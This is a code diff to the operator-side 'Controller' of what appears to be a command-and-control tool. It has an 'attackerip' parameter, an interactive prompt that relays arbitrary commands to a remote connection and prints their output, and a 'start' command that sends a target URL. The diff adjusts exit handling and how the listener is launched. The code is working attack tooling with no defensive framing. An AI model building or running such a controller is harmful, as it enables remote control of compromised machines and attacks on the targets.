@@ -39,28 +39,28 @@ class Controller(object):
             print(f"connecting to {server_ip}:{server_port}...")
             print('connected!\n')
             while True:
-                try:
-                    host = socket.gethostname()
-                    cmd = input(f'{host}~# ')
-                    if cmd == 'gg':
-                        s.send('gg'.encode())
-                        print(s.recv(1024).decode())
-                    elif cmd == 'start':
-                        s.send(cmd.encode())
-                        ui = input('enter url: ')
-                        s.send(ui.encode())
-                    elif cmd == 'clear':
-                        os.system('clear')
-                    elif cmd == 'exit':
-                        s.close()
-                        exit(0)
-                    else:
-                        s.send(cmd.encode())
-                        print(s.recv(1024).decode())
-                except EOFError:
-                    pass
+                host = socket.gethostname()
+                cmd = input(f'{host}~# ')
+                if cmd == 'gg':
+                    s.send('gg'.encode())
+                    print(s.recv(1024).decode())
+                elif cmd == 'start':
+                    s.send(cmd.encode())
+                    ui = input('enter url: ')
+                    s.send(ui.encode())
+                elif cmd == 'clear':
+                    os.system('clear')
+                elif cmd == 'exit':
+                    s.send('close'.encode())
+                    s.close()
+                    exit(0)
+                else:
+                    s.send(cmd.encode())
+                    print(s.recv(1024).decode())
         except Exception:
             print('python3 <file-name.py> -h for help')
+
+
 if __name__ == "__main__":
     main_class = Controller(args.attackerip,args.port)
     banner = Process(target=main_class.show_banner,args=('''
@@ -78,8 +78,6 @@ if __name__ == "__main__":
            `d8888b' `
              `bd'
     ''',)) 
-    listener = Process(target=main_class.listen)
     banner.start()
     banner.join()
-    listener.start()
-    listener.join()
+    main_class.listen()
